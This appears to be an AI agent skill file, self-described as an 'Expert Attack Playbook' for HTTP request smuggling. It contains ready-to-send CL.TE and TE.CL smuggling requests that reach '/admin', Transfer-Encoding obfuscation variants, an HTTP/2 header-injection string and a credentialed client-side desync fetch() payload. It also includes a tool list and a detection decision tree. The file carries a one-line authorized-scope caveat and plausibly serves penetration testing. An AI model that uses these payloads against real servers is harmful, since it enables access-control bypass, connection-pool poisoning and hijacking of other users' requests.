---
name: request-smuggling
description: >-
  HTTP request smuggling and desynchronization testing. Use when front proxies,
  CDNs, or load balancers disagree with the origin on message framing
  (Content-Length vs Transfer-Encoding), on HTTP/2->HTTP/1 translation, or when
  exploring client-side desync via browser fetch pipelines.
---

# SKILL: HTTP Request Smuggling — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert HTTP desync techniques. Covers CL.TE, TE.CL, TE.TE obfuscation variants, HTTP/2 downgrade and pseudo-header confusion, client-side desync (browser fetch pipelines), and tool-assisted fuzzing. This is **message boundary disagreement** between hops, not header injection.

---

## 1. QUICK START

### CL.TE first probe

Front-end trusts Content-Length; back-end trusts Transfer-Encoding chunked.

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Front end reads 13 bytes (complete). Back end parses as chunked: after `0\r\n\r\n`, treats `SMUGGLED` as the next request's start bytes.

### TE.CL first probe

Front-end trusts chunked; back-end trusts Content-Length.

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

Back end reads only 4 bytes (`35\r\n`), leaves rest buffered for next request.

**Safety note**: Test only within authorized scope; smuggling can poison connection pools.

---

## 2. CL.TE VULNERABILITIES

Front trusts `Content-Length`; back trusts `Transfer-Encoding: chunked`.

Body: `0\r\n\r\nSMUGGLED` — 13 bytes. Back-end sees chunked end at `0\r\n\r\n`; `SMUGGLED` becomes next request prefix.

---

## 3. TE.CL VULNERABILITIES

Front parses chunked; back reads only `Content-Length`.

Full TE.CL with embedded second request: `Content-Length: 4` + chunk-length line `35\r\n` + `GET /admin...`.

Back end reads 4 bytes → marks body complete → remaining bytes buffered for next connection reuse.

---

## 4. TE.TE OBFUSCATION VARIANTS

Both sides claim to process TE but differ on which value is valid:

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[TAB]chunked
 Transfer-Encoding: chunked
X: X
Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

For each (front, back) pair, find which variant each side accepts as chunked, then map to CL.TE or TE.CL.

---

## 5. HTTP/2 REQUEST SMUGGLING

### H2→H1 Downgrade

Edge supports HTTP/2; origin uses HTTP/1.1. If implementation doesn't strictly normalize:
- Forbidden headers forwarded incorrectly
- Duplicate-header merge rules inconsistent with origin

### Pseudo-header injection

```text
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

If one hop keeps the full string in a header value and the next mis-splits during H1 reconstruction, parsing may start a new request at `\r\n\r\n`.

---

## 6. CLIENT-SIDE DESYNC

Browser `no-cors` + `fetch` with body containing raw HTTP creates queue effects:

```javascript
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

Success appears as side effects on other requests over the same connection.

---

## 7. TOOLS

| Tool | Purpose |
|------|------|
| **Burp Suite HTTP Request Smuggler** | Automated desync detection |
| **defparam/smuggler** | Python scripts for CL.TE/TE.CL probes |
| **dhmosfunk/simple-http-smuggler-generator** | Assemble raw CL.TE/TE.CL templates |

---

## 8. DETECTION DECISION TREE

```
                    Start: reverse proxy / CDN in path?
                                |
                NO -------------+------------- YES
                |                               |
        Low classic smuggling            Can you send TE + CL together?
        (still test H2 desync)                  |
                              NO ---------------+------------------- YES
                              |                                       |
                      Test H2-only issues             Front prefers which?
                      (pseudo-header, reset)                          |
                                    +------------------+--------------+----------+
                                    |                  |                         |
                               CL wins             TE wins                  errors
                                    |                  |                         |
                               CL.TE probes       TE.CL probes             TE.TE obfuscation
                                    |                  |                         |
                                    +------------------+-------------------------+
                                                       |
                                             Confirm with second
                                             smuggled request or
                                             Collaborator side signal
```

---

## Related

- H2.CL/H2.TE variants, CL.0, Fat GET, cache poisoning chains, CSD, CDN matrix: see [H2_SMUGGLING_VARIANTS.md](./H2_SMUGGLING_VARIANTS.md)
- CRLF Injection: `../crlf-injection/SKILL.md`
- Web Cache Deception: `../web-cache-deception/SKILL.md`
